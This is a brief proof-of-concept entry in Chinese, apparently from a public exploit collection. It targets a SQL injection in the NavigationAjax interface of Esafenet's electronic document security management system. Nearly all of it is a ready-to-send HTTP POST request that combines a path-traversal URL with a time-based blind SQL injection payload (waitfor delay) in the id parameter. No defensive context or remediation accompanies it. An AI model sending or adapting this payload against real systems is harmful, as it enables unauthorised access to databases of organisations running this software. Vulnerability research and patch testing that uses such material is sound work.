## 亿赛通电子文档安全管理系统NavigationAjax接口存在SQL注入漏洞


## poc
```
POST /CDGServer3/js/../NavigationAjax HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded

command=nav&id=-999'waitfor delay '0:0:3'--+&name=&openId=
```

![image](https://github.com/wy876/POC/assets/139549762/8bb3c1c9-a38d-475a-9162-8ad5de56b03f)
